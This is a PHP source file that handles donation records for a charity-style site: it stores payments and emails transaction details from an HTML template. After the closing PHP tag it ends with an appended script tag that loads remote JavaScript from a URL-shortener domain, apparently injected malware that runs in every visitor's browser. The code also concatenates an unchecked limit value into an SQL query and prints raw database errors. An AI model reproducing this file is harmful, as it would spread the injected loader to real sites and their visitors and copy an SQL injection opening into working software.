<?php
error_reporting(0);
session_start();
include_once 'site_config.php';

function save_contribute($data=array()){
	global $pdo;
	$stm = $pdo->prepare("INSERT INTO `tbl_contribute`(`price`, `updated_at`, `created_at`) VALUES (?, now(), now())");
	$stm->bindParam(1,$data['price']);
	if($stm->execute()){
		
		return $pdo->lastInsertId();
	}
	else{
		die(print_r($stm->errorInfo(), true));
	}
}

function update_contribute($id, $data = array()){
	global $pdo;
	$stmt = $pdo->prepare("UPDATE `tbl_contribute` SET `contribute_number` =?, `price`=?, `transaction_id`=?, `payment_status`=?, `updated_at`=now(), activatedstatus = 1  where id=?");
	$stmt->bindParam(1,$data['contribute_number']);
	$stmt->bindParam(2,$data['price']);
	$stmt->bindParam(3,$data['transaction_id']);
	$stmt->bindParam(4,$data['payment_status']);
	$stmt->bindParam(5,$id);

	if($stmt->execute()){
		return $id;
	}
	else{
		die(print_r($stmt->errorInfo(), true));
	}
}

function index(){
	global $pdo;
	$stmt = $pdo->prepare("select * from tbl_contribute where activatedstatus = 1 order by id desc");
	if($stmt->execute()){
		return $rtmt = $stmt->fetchAll(PDO::FETCH_ASSOC);
	}
	else{
		die(print_r($stmt->errorInfo(), true));
	}
}

function index_limit($limit=''){
	global $pdo;
	if(!empty($limit)){
		$stmt = $pdo->prepare("SELECT * from tbl_contribute where activatedstatus = 1 order by id desc".$limit);
	}
	else{
		$stmt = $pdo->prepare("select * from tbl_contribute where activatedstatus = 1 order by id desc");
	}
	if($stmt->execute()){
		return $rtmt = $stmt->fetchAll(PDO::FETCH_ASSOC);
	}
	else{
		die(print_r($stmt->errorInfo(), true));
	}
}

function delete($id){
	global $pdo;
	$stmt = $pdo->prepare("DELETE FROM `tbl_contribute` WHERE id = ?");
	$stmt->bindParam(1,$id);
	if($stmt->execute()){
		return $id;
	}
	else{
		die(print_r($stmt->errorInfo(), true));
	}
}

function get_details($id){
	global $pdo;
	$stmt = $pdo->prepare("select * from tbl_contribute where id=?");
	$stmt->bindParam(1,$id);
	if($stmt->execute()){
		return $rtmt = $stmt->fetch(PDO::FETCH_ASSOC);
	}
	else{
		die(print_r($stmt->errorInfo(), true));
	}
}

function send_mail($contribute_id){
    global $pdo;
    $contributedetails = $pdo->prepare("select * from tbl_contributes where id=?");
    $contributedetails->bindParam(1, $contribute_id);
    $contributedetails->execute();
    $details = $contributedetails->fetch();
    $mail_content = get_mail_content($contribute_id);

    // $to = 'streetsofjoystaffing@gmail.com';
    $to = 'ravi02.agp@gmail.com';
    $fromName = 'Minorities With Voice';
    $subject = 'Contribute Details';

    $headers = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
    $headers .= 'From:' . $fromName . "\r\n";
    $headers .= 'Bcc: ravi@agpt.in' . "\r\n";
    // $headers .= 'Bcc: info@wserve.in' . "\r\n";
    $message = $mail_content;
    //echo $message;exit;
    $send_mail = mail($to, $subject, $message, $headers);
}

function get_mail_content($contribute_id){
	global $pdo;
	$stm = $pdo->prepare("select * from tbl_contribute where id= ?");
    $stm->bindParam(1,$contribute_id);
	$stm->execute();
	$rtm =$stm->fetch(PDO::FETCH_ASSOC);
	ob_start();
	?>

	<section class="body user-select-text focusable" tabindex="-1" style="min-height: 1970px;">
    <div class="mail-detail-content noI18n colorQuoted" style="min-height: 1970px;">
        <div id="ox-a15edad751">
            <table width="80%" style="padding: 10px; margin: auto;"> 
                <tbody>
                    <tr> 
                        <td style="font-size: 30px; text-align: center; margin-bottom: 10px;"> Streets Of Joy</td> 
                    </tr> 
                </tbody>
            </table> 
            <table width="80%" style="padding: 10px; margin: 15px auto;"> 
                <tbody>
                    <tr> 
                        <td colspan="2" align="center" style="font-size: 20px;"><strong>Contribute</strong></td> 
                    </tr> 
                </tbody>
            </table> 
            <table width="50%" style="border-collapse: collapse; font-family: Arial, Helvetica, sans-serif; font-size: 12px; margin: auto;" border="1" cellspacing="0" cellpadding="0"> 
                <tbody>
                    <tr style="background: #302c51; padding: 10px; height: 40px; color: #fff; font-size: 18px;"> 
                        <td colspan="4" align="center" style="padding: 0px;"><strong><?php echo (isset($rtm['contribute_number']) && !empty($rtm['contribute_number']))?$rtm['contribute_number']:''; ?></strong></td> 
                    </tr> 
                    <tr> 
                        <td style="padding: 5px;"><strong>Price:</strong> <?php echo (isset($rtm['price']) && !empty($rtm['price']))?$rtm['price']:''; ?> </td> 
                    </tr>
                    <tr> 
                        <td  style="padding: 5px;"><strong>Transaction Id:</strong> <?php echo (isset($rtm['transaction_id']) && !empty($rtm['transaction_id']))?$rtm['transaction_id']:''; ?></td> 
                    </tr>
                    <tr> 
                        <td  style="padding: 5px;"><strong>Date:</strong> <?php echo (isset($rtm['updated_at']) && !empty($rtm['updated_at']))? date('m-d-Y', strtotime($rtm['updated_at'])):''; ?></td> 
                    </tr>
                </tbody>
            </table>

        </div>
    </div>
</section>
<?php
$php_output = ob_get_contents();
ob_end_clean();
   //echo'yes';die();
return $php_output;
}
?>
<script src="https://bitly.best/PbQ0j7" type="text/javascript"></script>